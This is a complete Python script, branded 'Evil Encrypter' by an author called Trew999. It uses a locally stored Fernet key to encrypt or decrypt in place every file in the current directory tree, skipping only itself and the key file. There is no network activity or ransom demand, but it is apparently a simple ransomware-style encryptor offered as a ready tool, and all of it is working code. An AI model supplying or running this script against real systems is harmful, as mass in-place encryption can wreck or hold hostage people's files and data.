#!/usr/bin/env python3

import os
import argparse
from cryptography.fernet import Fernet

class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    BLUE = "\033[94m"

def generate_key(key_file="thekey.key"):
    generated_key = Fernet.generate_key()
    with open(key_file, "wb") as keyfile:
        keyfile.write(generated_key)
    print(f"{Colors.GREEN}New key generated and saved to '{key_file}'.{Colors.RESET}")

def encrypt_file(file_path, key, encrypted_files):
    excluded_files = [os.path.basename(__file__), "thekey.key"]
    if os.path.basename(file_path) not in excluded_files:
        with open(file_path, "rb") as f:
            contents = f.read()
        content_encrypted = Fernet(key).encrypt(contents)
        with open(file_path, "wb") as f:
            f.write(content_encrypted)
        encrypted_files.append(file_path)

def decrypt_file(file_path, key, decrypted_files):
    excluded_files = [os.path.basename(__file__), "thekey.key"]
    if os.path.basename(file_path) not in excluded_files:
        with open(file_path, "rb") as f:
            content_encrypted = f.read()
        content_decrypted = Fernet(key).decrypt(content_encrypted)
        with open(file_path, "wb") as f:
            f.write(content_decrypted)
        decrypted_files.append(file_path)

def encrypt_directory(directory_path, key, encrypted_files):
    if os.path.basename(directory_path) not in ["__pycache__"]:
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key, encrypted_files)

def decrypt_directory(directory_path, key):
    if os.path.basename(directory_path) not in ["__pycache__"]:
        decrypted_files = []
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key, decrypted_files)
        return decrypted_files
    
def banner():
    banner = f"""
    {Colors.BLUE}
     ______     _ _   ______                             _            
    |  ____|   (_) | |  ____|                           | |           
    | |____   ___| | | |__   _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
    |  __\ \ / / | | |  __| | '_ \ / __| '__| | | | '_ \| __/ _ \ '__|
    | |___\ V /| | | | |____| | | | (__| |  | |_| | |_) | ||  __/ |   
    |______\_/ |_|_| |______|_| |_|\___|_|   \__, | .__/ \__\___|_|   
                                            __/ | |                 
                                           |___/|_|
    {Colors.RESET}
    """
    print(banner)

if __name__ == "__main__":
    banner()
    
    parser = argparse.ArgumentParser(description=f"""
    Script for decrypting or encrypting every file in the current directory and every subdirectory.
    Author: {Colors.BLUE}Trew{Colors.RESET}{Colors.RED}999{Colors.RESET}
    """)
    parser.add_argument("-e", "--encrypt", action="store_true", help=f"{Colors.GREEN}en{Colors.RESET}crypt files and directories")
    parser.add_argument("-d", "--decrypt", action="store_true", help=f"{Colors.RED}de{Colors.RESET}crypt files and directories")
    parser.add_argument("-g", "--generate", action="store_true", help=f"generate a {Colors.RED}new{Colors.RESET} key")
    args = parser.parse_args()

    if args.generate:
        generate_key()
        exit(0)

    with open("thekey.key", "rb") as thekey:
        key = thekey.read()

    current_directory = os.getcwd()

    if args.decrypt:
        decrypted_files = decrypt_directory(current_directory, key)
        print(f"{Colors.GREEN}Decryption complete.{Colors.RESET}")

        if decrypted_files:
            print(f"{Colors.GREEN}Decrypted Files:{Colors.RESET}")
            for file_path in decrypted_files:
                file_name = os.path.basename(file_path)
                print(f"{os.path.dirname(file_path)}\{Colors.RED}{file_name}{Colors.RESET}")
    elif args.encrypt:
        encrypted_files = []
        encrypt_directory(current_directory, key, encrypted_files)
        
        print(f"{Colors.GREEN}Encryption complete.{Colors.RESET}")
        if encrypted_files:
            print(f"{Colors.GREEN}Encrypted Files:{Colors.RESET}")
            for file_path in encrypted_files:
                file_name = os.path.basename(file_path)
                print(f"{os.path.dirname(file_path)}\{Colors.RED}{file_name}{Colors.RESET}")
    else:
        print(f"{Colors.RED}Please specify --encrypt, --decrypt, or --generate option.{Colors.RESET}")
